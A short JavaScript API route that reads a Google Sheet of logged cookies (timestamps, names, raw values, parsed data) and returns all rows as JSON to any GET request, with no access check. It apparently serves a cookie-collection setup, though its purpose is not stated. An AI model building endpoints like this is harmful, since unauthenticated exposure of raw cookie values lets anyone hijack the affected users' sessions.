import { GoogleSpreadsheet } from 'google-spreadsheet';

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    // Initialize the sheet
    const doc = new GoogleSpreadsheet(process.env.GOOGLE_SHEET_ID);
    
    // Authenticate with Google Sheets
    await doc.useServiceAccountAuth({
      client_email: process.env.GOOGLE_SERVICE_ACCOUNT_EMAIL,
      private_key: process.env.GOOGLE_PRIVATE_KEY.replace(/\\n/g, '\n'),
    });
    
    await doc.loadInfo();
    const sheet = doc.sheetsByIndex[0];
    
    // Get all rows
    const rows = await sheet.getRows();
    
    // Format the response
    const cookies = rows.map(row => ({
      timestamp: row['Timestamp'],
      cookieName: row['Cookie Name'],
      rawCookie: row['Raw Cookie'],
      parsedData: JSON.parse(row['Parsed Data'] || '{}')
    }));
    
    res.status(200).json(cookies);
  } catch (error) {
    console.error('Error retrieving cookies:', error);
    res.status(500).json({ error: 'Failed to retrieve cookies: ' + error.message });
  }
}
